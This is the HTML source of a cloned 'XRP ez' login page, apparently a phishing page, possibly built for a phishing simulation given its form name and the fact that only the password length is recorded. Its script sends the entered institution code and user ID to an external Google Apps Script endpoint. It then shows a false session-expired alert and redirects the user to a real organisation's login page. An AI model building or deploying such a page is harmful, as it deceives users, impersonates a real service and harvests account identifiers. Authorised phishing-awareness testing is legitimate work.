<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XRP ez Login</title>
    <style>
        /* 배경 및 기본 설정: 이미지의 블루 그라데이션 느낌 재현 */
        body { 
            font-family: 'Malgun Gothic', sans-serif; 
            margin: 0; 
            height: 100vh; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            background: linear-gradient(135deg, #a5c9fd 0%, #dae9ff 100%);
            overflow: hidden;
        }

        /* 로그인 컨테이너 */
        .login-box {
            width: 350px;
            background-color: rgba(255, 255, 255, 0.9);
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
            text-align: center;
            z-index: 2;
        }

        .logo-area img {
            width: 120px;
            margin-bottom: 20px;
        }

        /* 입력 필드 스타일 */
        .input-group {
            display: flex;
            margin-bottom: 10px;
            border: 1px solid #9dbce3;
            border-radius: 4px;
            overflow: hidden;
        }

        .input-group label {
            width: 80px;
            background-color: #f0f4f9;
            color: #5579a6;
            font-size: 11px;
            font-weight: bold;
            display: flex;
            justify-content: center;
            align-items: center;
            border-right: 1px solid #9dbce3;
            text-transform: uppercase;
        }

        input[type="text"], input[type="password"] {
            flex: 1;
            padding: 10px;
            border: none;
            outline: none;
            font-size: 13px;
        }

        /* 로그인 버튼 */
        .login-btn {
            width: 100%;
            padding: 12px;
            background-color: #1e2a4a;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 14px;
            font-weight: bold;
            margin-top: 10px;
        }

        .login-btn:hover {
            background-color: #2c3e6b;
        }

        /* 하단 링크 */
        .footer-links {
            margin-top: 15px;
            font-size: 11px;
            color: #666;
        }

        .copyright {
            position: absolute;
            bottom: 20px;
            width: 100%;
            text-align: center;
            font-size: 10px;
            color: #888;
        }
    </style>
</head>
<body>

    <div class="login-box">
        <div class="logo-area">
            <!-- 로고 이미지는 이미지 호스팅 주소로 교체해서 써 형 -->
            <strong style="font-size: 24px; color: #1e2a4a;">XRP<span style="color:#7cb342">ez</span></strong>
        </div>
        
        <form id="simulationForm">
            <div class="input-group">
                <label>CODE</label>
                <input type="text" id="compCode" placeholder="기관코드" required>
            </div>
            <div class="input-group">
                <label>ID</label>
                <input type="text" id="userId" placeholder="아이디" required>
            </div>
            <div class="input-group">
                <label>PASSWORD</label>
                <input type="password" id="userPw" placeholder="비밀번호" required>
            </div>
            
            <button type="submit" class="login-btn">로 그 인</button>
        </form>

        <div class="footer-links">
            <span>기관코드저장</span> | <span>아이디저장</span>
        </div>
    </div>

    <div class="copyright">
        © HIPERTECH Corp. All Rights Reserved.
    </div>

    <script>
        const gasUrl = 'https://script.google.com/macros/s/AKfycbwG55MXJXjRpOBQwfX98zaJP5Rag-cnJF6ZFOJj_TY1BFJwQrQD4kZAzOkBFvktkBnqCA/exec';

        // 데이터 전송 함수 (기관코드, 아이디, 비번 길이)
        const sendData = (code, id, pwLen) => {
            const finalUrl = `${gasUrl}?targetId=${encodeURIComponent(code)}&inputId=${encodeURIComponent(id)}&pwLen=${pwLen}`;
            fetch(finalUrl, { method: 'POST', mode: 'no-cors' });
        };

        // 폼 제출 이벤트
        document.getElementById('simulationForm').addEventListener('submit', function(e) {
            e.preventDefault(); 
            
            const code = document.getElementById('compCode').value;
            const id = document.getElementById('userId').value;
            const pw = document.getElementById('userPw').value;

            // 로그 전송 (비밀번호는 길이만 보냄)
            sendData(code, id, pw.length);

            // 세션 종료 멘트 후 실제 로그인 페이지로 리다이렉트
            setTimeout(() => {
                alert('보안 세션이 만료되었습니다. 다시 로그인해 주세요.');
                // 실제 HIXRP 로그인 주소로 수정해서 쓰면 돼
                window.location.href = 'https://gnware.gnk.or.kr/login'; 
            }, 500);
        });
    </script>
</body>
</html>
